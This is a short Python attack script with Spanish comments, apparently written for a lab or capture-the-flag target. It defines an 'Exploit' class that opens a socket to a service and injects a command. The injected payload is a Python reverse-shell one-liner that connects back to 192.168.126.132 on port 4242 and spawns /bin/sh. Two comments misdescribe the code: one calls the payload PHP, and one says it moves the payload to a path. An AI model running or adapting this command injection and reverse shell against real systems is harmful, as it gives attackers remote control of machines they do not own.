import socket#Conexiones cliente - servidor
class Exploit:
    #Le pasamos como argumento al host, al puerto, a la direccion
    def __init__(self,host,port):
        self.host = host# Dirección IP o dominio del servidor
        self.port = port# Puerto del servidor
        self.sock = None# Variable para la conexión de red

    def connect(self):
        try:
            self.sock = socket.create_connection((self.host,self.port))
            self.sock.recv(1024)
            return True
        except Exception as e:
            print(f"Error al conectarse a {self.host} en el puerto {self.port}: {e}")
            return False
        
    def send_command(self,command):
        try:
            #Mensaje que queremos enviar al servidor 
            self.sock.sendall(command.encode('utf-8'))
            #Respuesta del servidor 
            return self.sock.recv(1024).decode('utf-8')
        except Exception as e:
            print(f"Error al enviar el comando {command}: {e}")
            return None

    def exploit(self):
        # Define un payload PHP para ejecutar comandos desde la URL.
        payload = "python -c \"import socket; import os; import pty; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('192.168.126.132', 4242)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); pty.spawn('/bin/sh')\""
        # Mueve el payload a la ruta de destino especificada.
        respuesta = self.send_command(f"AB; {payload} \n")
        print(f"Exploit enviado. Respuesta del servicio: {respuesta}")

        
    def run(self):
        if self.connect():
            self.exploit()